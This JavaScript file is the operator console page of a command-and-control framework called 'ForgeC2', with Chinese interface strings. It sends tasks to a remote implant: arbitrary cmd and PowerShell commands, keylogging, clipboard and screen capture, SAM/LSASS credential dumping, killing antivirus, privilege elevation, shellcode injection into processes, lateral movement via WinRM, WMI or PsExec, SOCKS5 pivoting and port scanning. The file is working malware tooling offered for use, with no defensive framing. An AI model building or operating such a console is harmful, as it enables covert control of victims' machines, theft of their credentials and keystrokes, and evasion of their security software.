// Shell terminal page - command execution, autocomplete, history, keylogger, process control

function handleKeyDown(event) {
    const input = document.getElementById('cmd-input');
    const autocompleteContainer = document.getElementById('autocomplete-container');

    if (event.key === 'Enter') {
        event.preventDefault();
        executeCommand();
    } else if (event.key === 'ArrowUp') {
        event.preventDefault();
        const prevValue = CommandHistory.up(input.value);
        input.value = prevValue;
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        const nextValue = CommandHistory.down(input.value);
        input.value = nextValue;
    } else if (event.key === 'Tab') {
        event.preventDefault();
        const selected = AutoComplete.getSelected();
        if (selected) {
            input.value = selected;
            AutoComplete.hide(autocompleteContainer);
        } else {
            const suggestions = AutoComplete.getSuggestions(input.value, osType);
            if (suggestions.length > 0) {
                input.value = suggestions[0];
            }
        }
    } else if (event.key === 'Escape') {
        AutoComplete.hide(autocompleteContainer);
    } else if (event.key === 'l' && event.ctrlKey) {
        event.preventDefault();
        clearTerminal();
    }
}

function handleInput(event) {
    const input = document.getElementById('cmd-input');
    const autocompleteContainer = document.getElementById('autocomplete-container');

    if (input.value.trim()) {
        AutoComplete.show(autocompleteContainer, input.value, (selected) => {
            input.value = selected;
            input.focus();
        });
    } else {
        AutoComplete.hide(autocompleteContainer);
    }
}

function requestPS() {
    fetch(`/agents/${agentId}/ps`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">PS></span> <span class="text-white">tasklist</span>');
                appendOutput('<span class="text-slate-500">进程列表已请求...</span>');
                setTimeout(() => fetchResult(data.task_id), 2000);
            }
        });
}

function requestScreenshot() {
    fetch(`/agents/${agentId}/screenshot`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">CMD></span> <span class="text-white">screenshot</span>');
                appendOutput('<span class="text-slate-500">截图已请求...</span>');
                setTimeout(() => fetchResult(data.task_id), 3000);
            }
        });
}

function executeCommand() {
    const input = document.getElementById('cmd-input');
    const cmd = input.value.trim();
    const shell = document.getElementById('shell-select').value;

    if (!cmd) return;

    CommandHistory.add(cmd);
    CommandHistory.resetIndex();

    const prompt = shell === 'powershell.exe' ? 'PS>' : 'CMD>';
    document.getElementById('prompt').textContent = prompt;

    appendOutput(`<span class="text-amber-400">${prompt}</span> <span class="text-white">${escapeHtml(cmd)}</span>`);

    input.value = '';

    appendOutput('<span class="text-slate-500">Executing...</span>');

    fetch(`/agents/${agentId}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `command=${encodeURIComponent(cmd)}&shell=${shell}`
    }).then(r => r.json()).then(data => {
        if (data.success) {
            setTimeout(() => fetchResult(data.task_id), 2000);
        } else {
            appendOutput('<span class="text-red-400">Error: ' + (data.error || 'Failed to send command') + '</span>');
        }
    }).catch(err => {
        appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
    });
}

function fetchResult(taskId) {
    fetch(`/agents/${agentId}/tasks/${taskId}`)
        .then(r => r.json())
        .then(data => {
            if (data.error) {
                appendOutput('<span class="text-red-400">Error: ' + escapeHtml(data.error) + '</span>');
                return;
            }

            const status = data.status;

            if (status === 'completed') {
                if (data.result && data.result.trim()) {
                    let out = data.result;
                    if (data.encoding === 'base64' || (out.length > 40 && /^[A-Za-z0-9+/=]+$/.test(out))) {
                        try {
                            const decoded = atob(out);
                            out = decoded;
                        } catch (e) {}
                    }
                    appendOutput('<span class="text-emerald-300">' + escapeHtml(out) + '</span>');
                } else {
                    appendOutput('<span class="text-emerald-300">Command executed successfully</span>');
                }
            } else if (status === 'failed') {
                if (data.error && data.error.trim()) {
                    appendOutput('<span class="text-red-400">' + escapeHtml(data.error) + '</span>');
                } else {
                    appendOutput('<span class="text-red-400">Command failed</span>');
                }
            } else {
                appendOutput('<span class="text-yellow-400">Waiting for response...</span>');
                setTimeout(() => fetchResult(taskId), 3000);
            }
        }).catch(err => {
            appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
        });
}

function appendOutput(html) {
    const output = document.getElementById('terminal-output');
    const line = document.createElement('div');
    line.innerHTML = html;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

function clearTerminal() {
    const output = document.getElementById('terminal-output');
    output.innerHTML = `
        <div class="text-slate-500">ForgeC2 Shell Terminal - Implant: ${agentHostname}</div>
        <div class="text-slate-500">Terminal cleared.</div>
        <div class="text-slate-500 mb-4">---</div>
    `;
}

function startKeylogger() {
    fetch(`/agents/${agentId}/keylogger/start`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">keylogger started</span>');
                setTimeout(() => fetchResult(data.task_id), 1500);
            }
        });
}

function stopKeylogger() {
    fetch(`/agents/${agentId}/keylogger/stop`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">keylogger stopped</span>');
                setTimeout(() => fetchResult(data.task_id), 1500);
            }
        });
}

function dumpKeylogger() {
    appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">dumping keylog...</span>');
    fetch(`/agents/${agentId}/keylogger/dump`, { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                setTimeout(() => fetchResult(data.task_id), 2000);
            }
        });
}

function suspendProc() {
    const target = document.getElementById('proc-target').value.trim() || '';
    if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
    appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">suspend ' + escapeHtml(target) + '</span>');
    fetch(`/agents/${agentId}/suspend`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
    });
}

function resumeProc() {
    const target = document.getElementById('proc-target').value.trim() || '';
    if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
    appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">resume ' + escapeHtml(target) + '</span>');
    fetch(`/agents/${agentId}/resume`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
    });
}

function quickCmd(cmd) {
    appendOutput('<span class="text-amber-400">CMD></span> <span class="text-white">' + escapeHtml(cmd) + '</span>');
    fetch(`/agents/${agentId}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'command=' + encodeURIComponent(cmd) + '&shell=cmd.exe'
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
    });
}

function killProc() {
    const target = document.getElementById('proc-target').value.trim() || '';
    if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
    appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">killproc ' + escapeHtml(target) + '</span>');
    fetch(`/agents/${agentId}/killproc`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
    });
}

function clipGet() {
    appendOutput('<span class="text-amber-400">CLIP></span> <span class="text-white">get</span>');
    fetch(`/agents/${agentId}/clipboard/get`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1200); });
}
function clipSet() {
    const data = prompt('输入要设置到剪贴板的内容:');
    if (!data) return;
    fetch(`/agents/${agentId}/clipboard/set`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'data=' + encodeURIComponent(data)
    }).then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-emerald-400">剪贴板已设置</span>'); });
}
function findFiles() {
    const pattern = document.getElementById('find-pattern').value.trim() || '*';
    appendOutput('<span class="text-amber-400">FIND></span> <span class="text-white">pattern=' + escapeHtml(pattern) + '</span>');
    fetch(`/agents/${agentId}/find`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'pattern=' + encodeURIComponent(pattern)
    }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
}

function listDrives() {
    appendOutput('<span class="text-amber-400">DRIVES></span> <span class="text-white">listing...</span>');
    fetch(`/agents/${agentId}/drives`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
}

function forceBeacon() {
    appendOutput('<span class="text-emerald-400">BEACON></span> <span class="text-white">forcing check-in...</span>');
    fetch(`/agents/${agentId}/beacon_now`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 500); });
}

function doReboot() {
    if (!confirm('确认重启目标机器?')) return;
    fetch(`/agents/${agentId}/reboot`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-orange-400">Reboot sent</span>'); });
}

function doShutdown() {
    if (!confirm('确认关机目标机器?')) return;
    fetch(`/agents/${agentId}/shutdown`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-red-400">Shutdown sent</span>'); });
}

function listServices() {
    appendOutput('<span class="text-amber-400">SERVICES></span> <span class="text-white">listing...</span>');
    fetch(`/agents/${agentId}/services`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
}

function doPortScan() {
    const t = prompt("Target e.g. 192.168.1.1:22,80,443 or 10.0.0.0/24:22");
    if (!t) return;
    appendOutput('<span class="text-amber-400">SCAN></span> ' + escapeHtml(t));
    fetch(`/agents/${agentId}/portscan`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(t) })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 3000); });
}

function doNetstat() {
    appendOutput('<span class="text-amber-400">NETSTAT></span> ...');
    fetch(`/agents/${agentId}/netstat`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
}

function doUsers() {
    appendOutput('<span class="text-amber-400">USERS></span> ...');
    fetch(`/agents/${agentId}/users`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
}

function doAV() {
    appendOutput('<span class="text-amber-400">AV></span> ...');
    fetch(`/agents/${agentId}/av`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
}

function doDownloadURL() {
    const url = prompt("URL to download:");
    if (!url) return;
    const dest = prompt("Dest path (optional):", "");
    fetch(`/agents/${agentId}/download_url`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'url=' + encodeURIComponent(url) + '&dest=' + encodeURIComponent(dest) })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
}

function doUninstall() {
    if (!confirm('Uninstall persistence and self-delete?')) return;
    fetch(`/agents/${agentId}/uninstall`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-red-400">Uninstall sent</span>'); });
}

function doSetSleep() {
    const s = prompt("New sleep,jitter e.g. 30,20");
    if (!s) return;
    fetch(`/agents/${agentId}/set_sleep`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'sleep=' + encodeURIComponent(s) })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1000); });
}

function killAV() {
    if (!confirm('确认一键终止反病毒软件？这可能触发告警！')) return;
    appendOutput('<span class="text-red-400">TERMINATE_AV></span> <span class="text-white">attempting to kill AV processes...</span>');
    fetch(`/agents/${agentId}/kill_av`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
}

function doElevate() {
    const cmd = prompt("提权后执行的命令 (留空默认 whoami):", "");
    appendOutput('<span class="text-purple-400">ELEVATE></span> <span class="text-white">' + escapeHtml(cmd || "default") + '</span>');
    fetch(`/agents/${agentId}/elevate`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'cmd=' + encodeURIComponent(cmd || "")
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(data.task_id), 3000);
    });
}

function doCreds() {
    appendOutput('<span class="text-amber-400">CREDS></span> dumping SAM/LSASS... (may require high priv)');
    fetch(`/agents/${agentId}/creds`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 4000); });
}

function doInject() {
    const pid = prompt("Target PID:", "");
    if (!pid) return;
    const tech = prompt("Technique (createremotethread | apc | earlybird):", "createremotethread");
    const sc = prompt("Shellcode base64 (or leave for test NOPs - not sent):", "");
    fetch(`/agents/${agentId}/inject`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `pid=${encodeURIComponent(pid)}&tech=${encodeURIComponent(tech || '')}&shellcode=${encodeURIComponent(sc || '')}`
    }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
}

function doLateral() {
    const spec = prompt("Lateral spec e.g. winrm|10.0.0.5|user|pass|whoami  OR  wmi|...  OR psexec|...", "winrm|127.0.0.1||whoami");
    if (!spec) return;
    appendOutput('<span class="text-indigo-400">LATERAL></span> ' + escapeHtml(spec));
    fetch(`/agents/${agentId}/lateral`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'spec=' + encodeURIComponent(spec)
    }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 4000); });
}

function doSocks() {
    const port = prompt("Implant local SOCKS5 port:", "1080");
    appendOutput('<span class="text-teal-400">SOCKS5></span> starting on agent port ' + (port||'1080'));
    fetch(`/agents/${agentId}/socks`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'port=' + encodeURIComponent(port || "1080")
    }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
}

document.getElementById('shell-select').addEventListener('change', function() {
    const prompt = this.value === 'powershell.exe' ? 'PS>' : 'CMD>';
    document.getElementById('prompt').textContent = prompt;
});

document.getElementById('cmd-input').focus();
